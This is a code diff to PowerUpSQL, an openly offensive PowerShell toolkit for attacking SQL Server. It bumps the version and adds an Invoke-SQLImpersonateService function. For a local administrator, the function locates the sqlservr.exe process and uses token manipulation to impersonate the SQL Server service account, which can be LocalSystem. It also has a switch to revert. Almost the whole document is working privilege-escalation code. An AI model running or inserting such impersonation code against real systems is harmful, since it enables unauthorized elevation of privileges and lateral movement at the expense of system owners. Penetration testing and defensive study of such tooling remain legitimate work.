@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.68
+        Version: 1.0.0.69
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -11992,6 +11992,106 @@ Function Invoke-SQLAuditTemplate
         {
             Return $TblData
         }
+    }
+}
+
+
+# ----------------------------------
+#  Invoke-SQLImpersonateService
+# ----------------------------------
+# Author: Mike Manzotti (@mmanzo_) and Scott Sutherland
+Function  Invoke-SQLImpersonateService
+{
+    <#
+            .PARAMETER Instance
+            This function can be used to impersonate a local SQL Server service account.
+            .EXAMPLE
+            PS C:\> Invoke-SQLImpersonateService -Instance SQLServer1\STANDARDDEV2014 -Verbose
+            VERBOSE: SQLServer1\STANDARDDEV2014 : Impersonating SQLServer1\STANDARDDEV2014 service account
+            VERBOSE: SQLServer1\STANDARDDEV2014 : - Process ID: 1234
+            VERBOSE: SQLServer1\STANDARDDEV2014 : - Service Account: LocalSystem
+
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'This can be used to revert to the original Windows user context.')]
+        [switch]$Rev2Self,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+    }
+
+    Process
+    {
+        
+        # Revert to original user context if flag is provided
+        if($Rev2Self){          
+            Invoke-TokenManipulation -RevToSelf | Out-Null
+            Return
+        }
+
+        # Check for provide instance
+        if(-not $Instance){
+            Write-Verbose "$Instance : No instance provided."
+            Return
+        }
+
+        # Get current user name
+        $WinCurrentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().name
+
+        # Verify local administrator privileges
+        $IsAdmin = Get-SQLLocalAdminCheck
+                
+        # Return if the current user does not have local admin privs
+        if($IsAdmin -ne $true){
+            write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
+            return
+        }else{
+            write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
+        }
+
+        # Check for running sql service processes that match the instance
+        Write-Verbose -Message "$Instance : Impersonating SQL Server process:" 
+        [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
+        [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
+                
+        # Return if no matches exist
+        if ($TargetPid -eq 0){
+            Write-Verbose -Message "$Instance : No process running for provided instance..."
+            return
+        }
+
+        # Status user if a match is found
+        Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
+        Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
+                
+        # Attempt impersonation 
+        try{
+            Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
+        }catch{
+            $ErrorMessage = $_.Exception.Message
+            Write-Verbose -Message "$Instance : Impersonation failed."
+            Write-Verbose  -Message " $Instance : $ErrorMessage"
+            return
+        }  
+        
+        Write-Verbose  -Message "$Instance : Done."                    
+    }
+
+    End
+    {
     }
 }
 
